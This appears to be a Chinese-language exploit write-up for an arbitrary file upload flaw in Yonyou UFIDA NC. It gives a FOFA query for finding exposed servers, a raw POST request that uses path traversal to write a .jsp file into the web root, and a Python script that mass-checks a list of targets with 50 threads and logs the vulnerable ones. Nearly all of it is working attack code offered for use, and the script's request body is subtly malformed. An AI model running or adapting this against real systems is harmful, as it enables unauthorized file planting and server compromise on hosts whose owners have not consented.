### FOFA

```markdown
app="用友-UFIDA-NC"
```

### poc

```markdown
POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
Host: 
User-Agent:Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Content-Length: 184
Content-Type: multipart/form-data; boundary=d4a110823af191efd06258260123e51c

--d4a110823af191efd06258260123e51c
Content-Disposition: form-data; name="file"; filename="404794.jsp"
Content-Type: text/plain

744376863182
--d4a110823af191efd06258260123e51c--
```

![图片](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/640)

上传的文件URL：http://xx.xx.xx.xx/404794.jsp

![ef469d1dddf13348270be32bc6849ee0](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/ef469d1dddf13348270be32bc6849ee0.jpg)

### py脚本

```py
import argparse, requests, sys, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 定义横幅
def banner():
    banner = """

██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    

                                                    data: 2024-10-08
                                                    version: 1.0.0
                                                    author: hulless-oat
"""
    print(banner)

# 定义主函数
def main():
    # 调用横幅
    banner()
    # argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="用友UFIDA NC portalptfileupload接口存在任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input file path')
    args = parser.parse_args()
    # 如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    # 如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list = []
        with open(args.file, mode='r', encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n', ''))
                # print(url_list)
                # 设置多线程
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    # 如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

# 定义poc
def poc(target):
    payload = '/portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C'
    url = target + payload
    headers = {
    'User-Agent':'Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)',
    'Accept-Encoding': 'gzip, deflate',
    'Accept':'*/*',
    'Connection': 'close',
    # 'Content-Length': '184',
    'Content-Type': 'multipart/form-data; boundary=d4a110823af191efd06258260123e51c',
    }
    data = {
        '--d4a110823af191efd06258260123e51c\r\n'
        'Content-Disposition': 'form-data; name="file"; filename="404794.jsp"\r\n'
        'Content-Type: text/plain\r\n'
        '\r\n'
        '744376863182\r\n'
        '--d4a110823af191efd06258260123e51c--\r\n'
    }
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    # 请求网页
    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, proxies=proxies, timeout=8)
        if res.status_code == 200:
            print(f'[+]{GREEN}该网站存在文件上传漏洞: {target}\n{RESET}')
            with open('result.txt', mode='a', encoding='utf-8') as fp:
                fp.write(target + '\n')
                return True
        else:
            print(f'该网站不存在文件上传漏洞')
    except:
        print(f'该网站存在问题，请手动测试')

if __name__ == '__main__':
    main()
```

